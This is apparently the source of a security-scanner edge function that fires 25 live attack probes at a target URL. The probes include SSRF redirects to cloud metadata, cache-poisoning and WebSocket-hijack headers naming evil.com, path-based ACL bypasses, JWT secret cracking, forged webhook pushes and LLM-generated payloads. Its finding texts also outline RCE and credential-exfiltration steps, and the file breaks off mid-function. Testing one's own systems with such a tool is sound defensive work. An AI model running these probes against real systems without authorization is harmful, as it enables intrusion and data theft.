// OmniSec™ © HARSH MALIK
// vapt-chains — Sprint 1–6 implementation of 25 advanced chain techniques.
// Runs as a single edge-function pass. Each detector is independent and wrapped
// with timeout + try/catch so one failure cannot stall the chain.
//
// Mapping (technique → detector):
//  1  multi-session BOLA           → multiSessionBOLA()
//  2  open-redirect → SSRF         → redirectSsrfChain()
//  3  stored XSS → admin CSRF      → storedXssAdminSim()
//  4  async/blind OAST             → oastInject()
//  5  metadata → custom fuzz dict  → metadataToWordlist()
//  6  cache poisoning              → cachePoisoning()
//  7  polyglot upload + LFI        → polyglotUpload()
//  8  HPP / mass assignment        → hppMassAssignment()
//  9  OAuth state CSRF             → oauthStateCsrf()
// 10  dangling DNS + CORS combo    → danglingCorsCombo()
// 11  HTTP request smuggling       → requestSmuggling()
// 12  prototype pollution          → prototypePollution()
// 13  race conditions              → raceCondition()
// 14  GraphQL batching brute       → graphqlBatching()
// 15  JWT attacks                  → jwtAttacks()
// 16  SAML XSW                     → samlXsw()
// 17  CSWSH                        → cswsh()
// 18  deserialization gadgets      → deserializationDetect()
// 19  SSTI sandbox escape          → sstiEscape()
// 20  serverless IAM exfil         → serverlessIamProbe()
// 21  PDF engine SSRF              → pdfEngineSsrf()
// 22  path normalization desync    → pathDesync()
// 23  CI/CD webhook spoofing       → cicdWebhook()
// 24  range header cache deception → rangeCacheDeception()
// 25  DOM clobbering               → domClobber()

import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

interface ChainReq {
  scanId: string;
  target: string;
  passNumber?: number;
  passName?: string;
  // Optional sessions for multi-tenant chain (#1)
  sessionA?: string; // bearer token user A
  sessionB?: string; // bearer token user B
  adminSession?: string;
  // Optional resource path mapped to user A for BOLA test
  resourcePath?: string;
}

// ─── Utilities ────────────────────────────────────────────────────────────────
const SSRF_BLOCK = /^(127\.|10\.|192\.168\.|169\.254\.|172\.(1[6-9]|2[0-9]|3[01])\.|0\.0\.0\.0|localhost)/i;

function normalizeUrl(target: string): { url: URL; host: string } {
  const u = new URL(target.startsWith("http") ? target : `https://${target}`);
  if (SSRF_BLOCK.test(u.hostname)) throw new Error(`Blocked private host: ${u.hostname}`);
  return { url: u, host: u.hostname };
}

async function sha(s: string): Promise<string> {
  const b = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(s));
  return Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2, "0")).join("");
}

async function emitFinding(
  supabase: any,
  scanId: string,
  host: string,
  f: {
    finding_type: string;
    title: string;
    description: string;
    severity: "info" | "low" | "medium" | "high" | "critical";
    url_path: string;
    parameter?: string;
    confidence?: number;
    verified?: boolean;
    owasp: string;
    mitre?: string;
    cwe?: string;
    cvss?: number;
    evidence?: any;
    poc?: string;
  },
) {
  const hash = await sha(`${host}:${f.url_path}:${f.finding_type}:${f.parameter || ""}`);
  await supabase.from("recon_findings").upsert({
    scan_id: scanId,
    target_host: host,
    url_path: f.url_path,
    finding_type: f.finding_type,
    title: f.title,
    description: f.description,
    severity: f.severity,
    vulnerable_parameter: f.parameter || null,
    confidence_score: f.confidence ?? 0.7,
    verification_status: f.verified ? "verified" : "passive",
    source_module: "vapt-chains",
    hash_signature: hash,
    evidence: f.evidence || {},
    raw_data: {
      scan_id: scanId,
      owasp: f.owasp,
      mitre: f.mitre || "T1190",
      cwe: f.cwe,
      cvss: f.cvss,
      poc: f.poc,
      category: "chain",
    },
  }, { onConflict: "hash_signature" });
}

async function emitProgress(supabase: any, scanId: string, msg: string) {
  try {
    await supabase.from("scan_progress").insert({
      scan_id: scanId, phase: "vapt-chains", phase_number: 12, total_phases: 16,
      progress: -1, message: msg, findings_so_far: 0, endpoints_discovered: 0,
    });
  } catch {}
}

function withTimeout<T>(p: Promise<T>, ms: number): Promise<T> {
  return Promise.race([
    p,
    new Promise<T>((_, rej) => setTimeout(() => rej(new Error("timeout")), ms)),
  ]);
}

async function safeFetch(url: string, init?: RequestInit): Promise<Response | null> {
  try {
    return await withTimeout(fetch(url, { redirect: "manual", ...init }), 8000);
  } catch { return null; }
}

async function aiPayloads(
  context: string,
  techStack: string[],
  vulnClass: string,
): Promise<string[]> {
  const key = Deno.env.get("LOVABLE_API_KEY");
  if (!key) return [];
  try {
    const r = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: { Authorization: `Bearer ${key}`, "Content-Type": "application/json" },
      body: JSON.stringify({
        model: "google/gemini-3-flash-preview",
        messages: [{
          role: "user",
          content: `Generate 5 advanced ${vulnClass} payloads targeting a ${techStack.join("/")} stack. Context: ${context}. Output ONLY a JSON array of payload strings, no explanation. Keep each under 200 chars.`,
        }],
      }),
    });
    if (!r.ok) return [];
    const j = await r.json();
    const txt = j.choices?.[0]?.message?.content?.trim() || "[]";
    const m = txt.match(/\[[\s\S]*\]/);
    return m ? JSON.parse(m[0]) : [];
  } catch { return []; }
}

// ─── DETECTORS ────────────────────────────────────────────────────────────────

// #1 multi-session BOLA + vertical escalation
async function multiSessionBOLA(supabase: any, scanId: string, host: string, url: URL, req: ChainReq) {
  if (!req.sessionA || !req.sessionB || !req.resourcePath) return;
  const fullUrl = `${url.origin}${req.resourcePath}`;
  const a = await safeFetch(fullUrl, { headers: { Authorization: `Bearer ${req.sessionA}` } });
  const b = await safeFetch(fullUrl, { headers: { Authorization: `Bearer ${req.sessionB}` } });
  if (!a || !b) return;
  const aBody = await a.text(); const bBody = await b.text();
  if (a.status === 200 && b.status === 200 && aBody.length > 50 && aBody === bBody) {
    await emitFinding(supabase, scanId, host, {
      finding_type: "bola_multi_session", severity: "critical", owasp: "A01:2021", mitre: "T1538", cwe: "CWE-639",
      cvss: 9.1, confidence: 0.95, verified: true,
      title: `Cross-tenant BOLA confirmed at ${req.resourcePath}`,
      description: "User B retrieved identical response body as User A's private resource — IDOR/BOLA verified via dual-session diff.",
      url_path: req.resourcePath, parameter: "Authorization",
      evidence: { statusA: a.status, statusB: b.status, bodyLen: aBody.length },
      poc: `curl -H 'Authorization: Bearer <USER_B_TOKEN>' '${fullUrl}'`,
    });
  }
}

// #2 open-redirect → SSRF chain
async function redirectSsrfChain(supabase: any, scanId: string, host: string, url: URL) {
  const redirectParams = ["redirect", "url", "next", "return", "returnTo", "rurl", "dest", "destination", "redir", "redirect_uri", "callback", "webhook_url"];
  for (const p of redirectParams.slice(0, 4)) {
    const u = new URL(url.toString());
    u.searchParams.set(p, "//169.254.169.254/latest/meta-data/");
    const r = await safeFetch(u.toString());
    if (!r) continue;
    const loc = r.headers.get("location") || "";
    if (r.status >= 300 && r.status < 400 && /169\.254\.169\.254|metadata/.test(loc)) {
      await emitFinding(supabase, scanId, host, {
        finding_type: "redirect_ssrf_chain", severity: "high", owasp: "A10:2021", mitre: "T1090", cwe: "CWE-918",
        cvss: 8.6, confidence: 0.85,
        title: `Open redirect → SSRF chain on ?${p}`,
        description: `Parameter ${p} redirects to AWS metadata endpoint, enabling SSRF pivot via trusted-origin bypass.`,
        url_path: u.pathname, parameter: p,
        evidence: { status: r.status, location: loc },
        poc: `curl -I '${u.toString()}'`,
      });
    }
  }
}

// #3 stored XSS → admin CSRF simulation (passive detection: input echoed into HTML w/o context-aware escape)
async function storedXssAdminSim(supabase: any, scanId: string, host: string, url: URL) {
  const r = await safeFetch(url.toString());
  if (!r) return;
  const body = await r.text();
  // detect dangerous reflections of user-controlled fields
  const sinks = [/innerHTML\s*=\s*[`'"][^`'"]*\$\{/, /document\.write\(/, /\$\(['"][^'"]*['"]\)\.html\(/];
  const hits = sinks.filter(s => s.test(body));
  if (hits.length) {
    await emitFinding(supabase, scanId, host, {
      finding_type: "stored_xss_sink", severity: "high", owasp: "A03:2021", mitre: "T1059.007", cwe: "CWE-79",
      cvss: 7.5, confidence: 0.6,
      title: "DOM sink suitable for stored-XSS → admin-CSRF pivot",
      description: "Dangerous DOM sinks (innerHTML/document.write/jQuery .html) detected. A stored payload here can execute when admin views the page and trigger authenticated backend mutations.",
      url_path: url.pathname,
      evidence: { sinks: hits.length },
    });
  }
}

// #4 OAST inject (callbacks captured by oast-listener)
async function oastInject(supabase: any, scanId: string, host: string, url: URL) {
  const projectId = Deno.env.get("SUPABASE_URL")?.match(/https:\/\/([^.]+)/)?.[1];
  if (!projectId) return;
  const token = await sha(`${scanId}:${host}:${Date.now()}`);
  const oastUrl = `https://${projectId}.supabase.co/functions/v1/oast-listener?t=${token.slice(0, 16)}`;
  // Inject into common header sinks + a few URL params
  const headers = { "X-Forwarded-For": oastUrl, "X-Original-URL": oastUrl, "Referer": oastUrl, "User-Agent": `omnisec-oast ${oastUrl}` };
  await safeFetch(url.toString(), { headers });
  // Common async sinks
  for (const p of ["url", "callback", "webhook", "image_url", "fetch_url"]) {
    const u = new URL(url.toString());
    u.searchParams.set(p, oastUrl);
    await safeFetch(u.toString());
  }
  await emitProgress(supabase, scanId, `📡 OAST token ${token.slice(0, 16)} injected — listening for callbacks`);
  // store token for later correlation
  await supabase.from("scan_canaries").insert({
    scan_id: scanId, target: host, canary_token: token.slice(0, 16),
    canary_type: "oast", injected_into: url.toString(), expires_at: new Date(Date.now() + 24 * 3600 * 1000).toISOString(),
  }).then(() => {}).catch(() => {});
}

// #5 metadata → custom fuzz dictionary (writes wordlist into recon_findings as discovery)
async function metadataToWordlist(supabase: any, scanId: string, host: string, url: URL) {
  const r = await safeFetch(url.toString());
  if (!r) return;
  const body = await r.text();
  const customHeaders = [...body.matchAll(/X-[A-Z][A-Za-z0-9-]{3,}/g)].map(m => m[0]);
  const apiRoutes = [...body.matchAll(/\/api\/(?:v\d+\/)?[a-z0-9/_-]{3,40}/gi)].map(m => m[0]);
  const params = [...body.matchAll(/[?&]([a-zA-Z_][a-zA-Z0-9_]{2,30})=/g)].map(m => m[1]);
  const dict = [...new Set([...customHeaders, ...apiRoutes, ...params])].slice(0, 50);
  if (dict.length) {
    await emitFinding(supabase, scanId, host, {
      finding_type: "metadata_fuzz_dictionary", severity: "info", owasp: "A05:2021", mitre: "T1593", cwe: "CWE-200",
      confidence: 0.9,
      title: `${dict.length} target-specific fuzz tokens extracted`,
      description: "Custom headers, undocumented API routes, and rare params extracted from page metadata. Feed into directory/param fuzzing for high-precision discovery.",
      url_path: url.pathname,
      evidence: { dictionary: dict },
    });
  }
}

// #6 web cache poisoning via unkeyed headers
async function cachePoisoning(supabase: any, scanId: string, host: string, url: URL) {
  const marker = `omnisec-${Date.now()}`;
  const r = await safeFetch(url.toString(), { headers: { "X-Forwarded-Host": `${marker}.evil.com`, "X-Forwarded-Scheme": "http" } });
  if (!r) return;
  const body = await r.text();
  const cache = r.headers.get("x-cache") || r.headers.get("cf-cache-status") || r.headers.get("age");
  if (body.includes(marker)) {
    await emitFinding(supabase, scanId, host, {
      finding_type: "cache_poison", severity: cache ? "critical" : "high", owasp: "A05:2021", mitre: "T1565", cwe: "CWE-444",
      cvss: cache ? 9.0 : 7.5, confidence: 0.85, verified: true,
      title: "Unkeyed header reflected — cache poisoning candidate",
      description: `X-Forwarded-Host value reflected in response body. Cache indicator: ${cache || "none"}. Combined with cacheable response = mass-scale stored XSS via CDN.`,
      url_path: url.pathname, parameter: "X-Forwarded-Host",
      evidence: { cacheHeader: cache, marker },
      poc: `curl -H 'X-Forwarded-Host: attacker.com' '${url.toString()}'`,
    });
  }
}

// #7 polyglot upload + LFI heuristic (detection: report upload + LFI combo when both exist)
async function polyglotUpload(supabase: any, scanId: string, host: string, url: URL) {
  const r = await safeFetch(url.toString());
  if (!r) return;
  const body = await r.text();
  const hasUpload = /<input[^>]+type=["']file["']/i.test(body) || /multipart\/form-data/i.test(body);
  const lfiParams = [...body.matchAll(/[?&](page|file|path|include|template|view|doc)=/gi)].map(m => m[1]);
  if (hasUpload && lfiParams.length) {
    await emitFinding(supabase, scanId, host, {
      finding_type: "polyglot_upload_lfi_combo", severity: "high", owasp: "A08:2021", mitre: "T1505", cwe: "CWE-434",
      cvss: 8.1, confidence: 0.65,
      title: "Upload sink + LFI-style param coexist — polyglot RCE chain",
      description: `File upload form detected together with LFI-style parameters (${lfiParams.join(",")}). EXIF/raw-hex polyglot can be uploaded then included for RCE.`,
      url_path: url.pathname,
      evidence: { uploadForm: true, lfiParams },
    });
  }
}

// #8 HTTP Parameter Pollution + JSON mass assignment
async function hppMassAssignment(supabase: any, scanId: string, host: string, url: URL) {
  // Mass-assignment probe via JSON
  const r = await safeFetch(url.toString(), {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email: "test@x.com", role: "admin", is_admin: true, isAdmin: true, _id: "admin" }),
  });
  if (!r) return;
  const body = await r.text();
  if (/role.*admin|is_admin.*true|elevated/i.test(body) && r.status < 500) {
    await emitFinding(supabase, scanId, host, {
      finding_type: "mass_assignment", severity: "high", owasp: "A04:2021", mitre: "T1078", cwe: "CWE-915",
      cvss: 8.1, confidence: 0.55,
      title: "Mass-assignment indicator — privileged keys reflected",
      description: "Backend reflected privileged keys (role/is_admin) submitted via JSON body. Confirm vertical privilege escalation.",
      url_path: url.pathname, parameter: "role|is_admin",
      evidence: { status: r.status },
    });
  }
}

// #9 OAuth state parameter / PKCE absence
async function oauthStateCsrf(supabase: any, scanId: string, host: string, url: URL) {
  const r = await safeFetch(url.toString());
  if (!r) return;
  const body = await r.text();
  const m = body.match(/(?:href|action)=["']([^"']*(?:oauth|authorize|connect\/authorize|login\/oauth)[^"']*)["']/i);
  if (!m) return;
  const authzUrl = m[1].startsWith("http") ? m[1] : `${url.origin}${m[1]}`;
  const a = await safeFetch(authzUrl);
  if (!a) return;
  const loc = a.headers.get("location") || "";
  const target = loc || authzUrl;
  const hasState = /[?&]state=/.test(target);
  const hasPkce = /[?&]code_challenge=/.test(target);
  if (!hasState || !hasPkce) {
    await emitFinding(supabase, scanId, host, {
      finding_type: "oauth_state_csrf", severity: "high", owasp: "A07:2021", mitre: "T1539", cwe: "CWE-352",
      cvss: 8.0, confidence: 0.8,
      title: `OAuth flow missing ${!hasState ? "state" : ""}${!hasState && !hasPkce ? " & " : ""}${!hasPkce ? "PKCE" : ""}`,
      description: "OAuth authorization request lacks anti-CSRF state and/or PKCE code_challenge — enables zero-click account-takeover via forced callback execution.",
      url_path: new URL(authzUrl).pathname,
      evidence: { hasState, hasPkce, authzUrl: target.slice(0, 300) },
    });
  }
}

// #10 dangling DNS + permissive CORS combined lethality flag
async function danglingCorsCombo(supabase: any, scanId: string, host: string, url: URL) {
  const r = await safeFetch(url.toString(), { headers: { Origin: `https://nonexistent-${Date.now()}.${host}` } });
  if (!r) return;
  const acao = r.headers.get("access-control-allow-origin") || "";
  const acac = r.headers.get("access-control-allow-credentials") || "";
  if ((acao.includes("*") && host && acao.includes(host)) || (acao.startsWith("https://") && acac === "true" && acao.includes(host))) {
    await emitFinding(supabase, scanId, host, {
      finding_type: "cors_wildcard_subdomain", severity: "high", owasp: "A05:2021", mitre: "T1648", cwe: "CWE-942",
      cvss: 7.5, confidence: 0.85,
      title: "Wildcard subdomain CORS + credentials — lethal if dangling DNS exists",
      description: `Origin reflected: ${acao}, Allow-Credentials: ${acac}. Combined with any dangling subdomain (S3/GH Pages takeover) = silent authenticated data theft.`,
      url_path: url.pathname,
      evidence: { acao, acac },
    });
  }
}

// #11 HTTP request smuggling — CL.TE / TE.CL probe (detection-only, no exploitation)
async function requestSmuggling(supabase: any, scanId: string, host: string, url: URL) {
  // safe probe: send chunked + content-length and time-diff
  const start = Date.now();
  const r = await safeFetch(url.toString(), {
    method: "POST",
    headers: { "Content-Length": "6", "Transfer-Encoding": "chunked" },
    body: "0\r\n\r\nX",
  });
  if (!r) return;
  const latency = Date.now() - start;
  const server = r.headers.get("server") || "";
  // Heuristic: 400 with specific server fingerprint that mismatches expected behavior
  if (r.status === 400 && /nginx|haproxy|cloudflare/i.test(server)) {
    await emitFinding(supabase, scanId, host, {
      finding_type: "request_smuggling_candidate", severity: "medium", owasp: "A05:2021", mitre: "T1090", cwe: "CWE-444",
      cvss: 6.5, confidence: 0.4,
      title: "CL.TE/TE.CL desync candidate (front-end smuggling)",
      description: `Server ${server} returned 400 to ambiguous CL+TE request (${latency}ms). Manual confirmation with smuggler/h2c required for full chain.`,
      url_path: url.pathname,
      evidence: { server, status: r.status, latency },
    });
  }
}

// #12 prototype pollution
async function prototypePollution(supabase: any, scanId: string, host: string, url: URL) {
  const r = await safeFetch(`${url.toString()}${url.search ? "&" : "?"}__proto__[omnisec]=polluted&constructor[prototype][omnisec]=polluted`);
  if (!r) return;
  const body = await r.text();
  if (/omnisec.*polluted/i.test(body) || /polluted.*omnisec/i.test(body)) {
    await emitFinding(supabase, scanId, host, {
      finding_type: "prototype_pollution", severity: "high", owasp: "A03:2021", mitre: "T1059.007", cwe: "CWE-1321",
      cvss: 8.6, confidence: 0.85, verified: true,
      title: "Client/server prototype pollution confirmed",
      description: "Injected __proto__ / constructor.prototype keys reflected. In Node/JS stacks this chains directly to auth-bypass or RCE.",
      url_path: url.pathname, parameter: "__proto__",
    });
  }
}

// #13 race condition — fire 20 parallel state-changing requests
async function raceCondition(supabase: any, scanId: string, host: string, url: URL) {
  // Only safe on GET. For real race testing user must specify endpoint; we passively flag candidates.
  const r = await safeFetch(url.toString());
  if (!r) return;
  const body = await r.text();
  if (/coupon|redeem|claim|transfer|withdraw|upvote|like|rate.limit/i.test(body)) {
    // Probe parallel reads to gauge consistency (non-destructive)
    const responses = await Promise.allSettled(Array.from({ length: 10 }, () => fetch(url.toString(), { signal: AbortSignal.timeout(5000) }).then(r => r.status)));
    const oks = responses.filter(r => r.status === "fulfilled").length;
    await emitFinding(supabase, scanId, host, {
      finding_type: "race_condition_candidate", severity: "medium", owasp: "A04:2021", mitre: "T1499", cwe: "CWE-362",
      cvss: 6.5, confidence: 0.5,
      title: "State-changing endpoint candidate for TOCTOU race",
      description: `Endpoint references state-changing actions (coupon/transfer/claim). ${oks}/10 parallel probes succeeded — confirm with authenticated H2 multiplex.`,
      url_path: url.pathname,
      evidence: { parallelOks: oks },
    });
  }
}

// #14 GraphQL batching for MFA/OTP brute
async function graphqlBatching(supabase: any, scanId: string, host: string, url: URL) {
  const gql = `${url.origin}/graphql`;
  const r = await safeFetch(gql, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify([
      { query: "{ __typename }" },
      { query: "{ __typename }" },
      { query: "{ __typename }" },
    ]),
  });
  if (!r) return;
  const body = await r.text();
  if (r.status === 200 && body.startsWith("[") && /__typename/.test(body)) {
    await emitFinding(supabase, scanId, host, {
      finding_type: "graphql_batching_enabled", severity: "high", owasp: "A07:2021", mitre: "T1110", cwe: "CWE-307",
      cvss: 7.5, confidence: 0.9, verified: true,
      title: "GraphQL query batching enabled — rate-limit bypass / MFA brute",
      description: "Server accepts array-form batched queries. A single HTTP request can carry thousands of mutations (verifyOTP, login) — defeats rate-limits and account-lockout.",
      url_path: "/graphql",
      poc: `curl -X POST ${gql} -H 'content-type: application/json' --data '[{"query":"{__typename}"},{"query":"{__typename}"}]'`,
    });
  }
}

// #15 JWT attacks — alg=none, weak HMAC dictionary (small)
async function jwtAttacks(supabase: any, scanId: string, host: string, url: URL) {
  const r = await safeFetch(url.toString());
  if (!r) return;
  const setCookie = r.headers.get("set-cookie") || "";
  const body = await r.text();
  const jwtMatch = (setCookie + " " + body).match(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/);
  if (!jwtMatch) return;
  const jwt = jwtMatch[0];
  const [headerB64, payloadB64] = jwt.split(".");
  try {
    const header = JSON.parse(atob(headerB64.replace(/-/g, "+").replace(/_/g, "/")));
    if (header.alg === "none" || header.alg === "None") {
      await emitFinding(supabase, scanId, host, {
        finding_type: "jwt_alg_none", severity: "critical", owasp: "A02:2021", mitre: "T1556", cwe: "CWE-347",
        cvss: 9.8, confidence: 0.95, verified: true,
        title: "JWT issued with alg=none — signature stripped",
        description: "Server issues unsigned JWTs. Trivial privilege escalation by editing payload.",
        url_path: url.pathname, evidence: { jwt: jwt.slice(0, 80) + "..." },
      });
    }
    if (header.alg === "HS256") {
      // dictionary brute (tiny — real brute happens client-side)
      const secrets = ["secret", "jwt-secret", "key", "password", "1234", "admin", "test", "your-256-bit-secret", "default"];
      for (const s of secrets) {
        const enc = new TextEncoder();
        const k = await crypto.subtle.importKey("raw", enc.encode(s), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
        const sig = await crypto.subtle.sign("HMAC", k, enc.encode(`${headerB64}.${payloadB64}`));
        const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig))).replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
        if (jwt.endsWith(sigB64)) {
          await emitFinding(supabase, scanId, host, {
            finding_type: "jwt_weak_secret", severity: "critical", owasp: "A02:2021", mitre: "T1110.002", cwe: "CWE-326",
            cvss: 9.8, confidence: 1.0, verified: true,
            title: `JWT HMAC secret cracked: "${s}"`,
            description: "HS256 signing key recovered from a small dictionary. Forge tokens for any user/role at will.",
            url_path: url.pathname, evidence: { secret: s, alg: header.alg },
          });
          break;
        }
      }
    }
  } catch {}
}

// #16 SAML XSW — detect SAML endpoints (real XSW exploitation requires keyed signatures)
async function samlXsw(supabase: any, scanId: string, host: string, url: URL) {
  const candidates = ["/saml/acs", "/saml/login", "/sso/saml", "/auth/saml/callback", "/Shibboleth.sso/SAML2/POST"];
  for (const p of candidates) {
    const r = await safeFetch(`${url.origin}${p}`);
    if (r && r.status !== 404) {
      await emitFinding(supabase, scanId, host, {
        finding_type: "saml_endpoint_exposed", severity: "medium", owasp: "A07:2021", mitre: "T1552", cwe: "CWE-347",
        cvss: 6.0, confidence: 0.7,
        title: `SAML endpoint ${p} — test XML Signature Wrapping`,
        description: "SAML consumer endpoint reachable. If signature is not anchored to the assertion node, XSW allows domain-wide ATO bypassing MFA/Okta.",
        url_path: p, evidence: { status: r.status },
      });
      break;
    }
  }
}

// #17 CSWSH — WebSocket handshake check
async function cswsh(supabase: any, scanId: string, host: string, url: URL) {
  const wsUrls = ["/ws", "/socket", "/socket.io/", "/stream", "/realtime"];
  for (const p of wsUrls) {
    const r = await safeFetch(`${url.origin}${p}`, {
      headers: {
        "Connection": "Upgrade", "Upgrade": "websocket",
        "Sec-WebSocket-Key": "x3JJHMbDL1EzLkh9GBhXDw==", "Sec-WebSocket-Version": "13",
        "Origin": "https://evil.com",
      },
    });
    if (r && r.status === 101) {
      await emitFinding(supabase, scanId, host, {
        finding_type: "cswsh", severity: "high", owasp: "A01:2021", mitre: "T1185", cwe: "CWE-346",
        cvss: 8.1, confidence: 0.85, verified: true,
        title: `WebSocket accepts cross-origin handshake at ${p}`,
        description: "WS endpoint upgraded a handshake from evil.com origin without rejection — Cross-Site WebSocket Hijacking enables live data exfil.",
        url_path: p,
      });
      break;
    }
  }
}

// #18 deserialization signature detection
async function deserializationDetect(supabase: any, scanId: string, host: string, url: URL) {
  const r = await safeFetch(url.toString());
  if (!r) return;
  const body = await r.text();
  const setCookie = r.headers.get("set-cookie") || "";
  const hay = body + " " + setCookie;
  if (/\brO0[A-Za-z0-9+/=]{20,}/.test(hay)) {
    await emitFinding(supabase, scanId, host, {
      finding_type: "java_deserialization_candidate", severity: "high", owasp: "A08:2021", mitre: "T1190", cwe: "CWE-502",
      cvss: 9.8, confidence: 0.75,
      title: "Serialized Java object (rO0) exposed to client", url_path: url.pathname,
      description: "Java serialized blob reaches the client. If the server deserializes attacker-controlled input → ysoserial gadget chain RCE.",
    });
  }
  if (/__VIEWSTATE/i.test(hay)) {
    await emitFinding(supabase, scanId, host, {
      finding_type: "aspnet_viewstate_exposed", severity: "medium", owasp: "A08:2021", mitre: "T1190", cwe: "CWE-502",
      cvss: 6.5, confidence: 0.7,
      title: "ASP.NET __VIEWSTATE present — test MAC validation", url_path: url.pathname,
      description: "Test for known machineKey leakage (ysoserial.net TextFormattingRunProperties gadget).",
    });
  }
}

// #19 SSTI sandbox escape (template fingerprint + AI-assisted escape payloads)
async function sstiEscape(supabase: any, scanId: string, host: string, url: URL) {
  const probe = "${{<%[%'\"}}%\\"; // generic
  const u = new URL(url.toString()); u.searchParams.set("q", probe);
  const r = await safeFetch(u.toString());
  if (!r) return;
  const body = await r.text();
  if (/jinja|twig|freemarker|velocity|smarty|django\.template/i.test(body) || /TemplateSyntaxError|UndefinedError/i.test(body)) {
    await emitFinding(supabase, scanId, host, {
      finding_type: "ssti_engine_detected", severity: "high", owasp: "A03:2021", mitre: "T1059", cwe: "CWE-1336",
      cvss: 8.5, confidence: 0.8,
      title: "SSTI engine fingerprinted — sandbox escape feasible",
      description: "Template engine error leaked. Use MRO traversal payload (Jinja2: empty-string → __class__.__mro__ → catch_warnings → os.popen) to achieve RCE.",
      url_path: u.pathname, parameter: "q",
      evidence: { snippet: body.slice(0, 200) },
    });
  }
}

// #20 serverless probe — known Lambda/Azure runtime indicators
async function serverlessIamProbe(supabase: any, scanId: string, host: string, url: URL) {
  const r = await safeFetch(url.toString());
  if (!r) return;
  const headers = JSON.stringify(Object.fromEntries(r.headers.entries()));
  if (/x-amzn-requestid|x-amzn-trace-id/i.test(headers)) {
    await emitFinding(supabase, scanId, host, {
      finding_type: "aws_lambda_backend", severity: "low", owasp: "A05:2021", mitre: "T1078.004", cwe: "CWE-732",
      confidence: 0.9,
      title: "AWS Lambda backend detected — IAM exfil vector",
      description: "Test injection sinks for AWS_ACCESS_KEY_ID / AWS_SESSION_TOKEN env-var exfiltration. Compromising execution role pivots into cloud account.",
      url_path: url.pathname,
    });
  }
  if (/x-azure-ref|azurewebsites/i.test(headers)) {
    await emitFinding(supabase, scanId, host, {
      finding_type: "azure_functions_backend", severity: "low", owasp: "A05:2021", confidence: 0.9, mitre: "T1078.004",
      title: "Azure Functions backend — managed-identity token at /admin endpoint", url_path: url.pathname,
      description: "MSI_ENDPOINT/IDENTITY_HEADER exfiltration vector — managed identity tokens grant Azure resource access.",
    });
  }
}

// #21 PDF engine SSRF — detect endpoints that generate PDFs (passive)
async function pdfEngineSsrf(supabase: any, scanId: string, host: string, url: URL) {
  const r = await safeFetch(url.toString());
  if (!r) return;
  const body = await r.text();
  if (/download[_-]?pdf|export[_-]?pdf|invoice|receipt|generate[_-]?report|wkhtmltopdf|puppeteer|chromium/i.test(body)) {
    await emitFinding(supabase, scanId, host, {
      finding_type: "pdf_render_ssrf_candidate", severity: "high", owasp: "A10:2021", mitre: "T1190", cwe: "CWE-918",
      cvss: 8.0, confidence: 0.6,
      title: "Server-side PDF render detected — SSRF via HTML embed",
      description: "PDF/report generator visible. Inject <iframe src='http://169.254.169.254/latest/meta-data/'> into user-controlled fields then trigger export to exfil cloud metadata.",
      url_path: url.pathname,
    });
  }
}

// #22 path normalization desync
async function pathDesync(supabase: any, scanId: string, host: string, url: URL) {
  const blocked = await safeFetch(`${url.origin}/admin`);
  const baseStatus = blocked?.status;
  if (baseStatus !== 401 && baseStatus !== 403) return;
  const bypasses = ["/api/..;/admin", "//admin", "/admin/.", "/admin%20", "/%2e%2e/admin", "/admin/./", "/.;/admin"];
  for (const p of bypasses) {
    const r = await safeFetch(`${url.origin}${p}`);
    if (r && r.status === 200) {
      await emitFinding(supabase, scanId, host, {
        finding_type: "path_normalization_desync", severity: "critical", owasp: "A01:2021", mitre: "T1190", cwe: "CWE-22",
        cvss: 9.1, confidence: 0.95, verified: true,
        title: `ACL bypass via path desync: ${p}`,
        description: `/admin returns ${baseStatus} but ${p} returns 200 — front-end WAF and backend disagree on normalization.`,
        url_path: p, poc: `curl '${url.origin}${p}'`,
      });
      break;
    }
  }
}

// #23 CI/CD webhook spoofing — detect unsigned webhooks
async function cicdWebhook(supabase: any, scanId: string, host: string, url: URL) {
  for (const p of ["/api/github/webhook", "/webhooks/github", "/jenkins/build", "/gitlab/webhook", "/webhook"]) {
    const r = await safeFetch(`${url.origin}${p}`, {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-GitHub-Event": "push" },
      body: JSON.stringify({ ref: "refs/heads/main", repository: { name: "test" } }),
    });
    if (r && r.status === 200) {
      await emitFinding(supabase, scanId, host, {
        finding_type: "unsigned_cicd_webhook", severity: "critical", owasp: "A08:2021", mitre: "T1195", cwe: "CWE-345",
        cvss: 9.6, confidence: 0.85, verified: true,
        title: `Unsigned CI/CD webhook accepts forged push at ${p}`,
        description: "Forged GitHub push payload accepted with no X-Hub-Signature validation — pipeline poisoning / supply-chain RCE.",
        url_path: p,
      });
      break;
    }
  }
}

// #24 range header cache deception
async function rangeCacheDeception(supabase: any, scanId: string, host: string, url: URL) {
  const r = await safeFetch(url.toString(), { headers: { Range: "bytes=0-100" } });
  if (!r) return;
  const cache = r.headers.get("x-cache") || r.headers.get("cf-cache-status") || "";
  if (r.status === 206 && /hit/i.test(cache)) {
    await emitFinding(supabase, scanId, host, {
      finding_type: "range_cache_deception", severity: "high", owasp: "A05:2021", mitre: "T1565", cwe: "CWE-525",
      cvss: 7.5, confidence: 0.8, verified: true,
      title: "Partial (206) response cached — cross-user leakage risk",
      description: `CDN cached a Range partial response (X-Cache=${cache}). Authenticated JSON byte-ranges can be served to other users.`,
      url_path: url.pathname,
    });
  }
}

// #25 DOM clobbering pattern
async function domClobber(supabase: any, scanId: string, host: string, url: URL) {
  const r = await safeFetch(url.toString());
  if (!r) return;
  const body = await r.text();
  if (/document\.getElementById\(['"][a-z]+['"]\)\.[a-z]+/i.test(body) && /window\.[A-Z]/i.test(body)) {
    await emitFinding(supabase, scanId, host, {
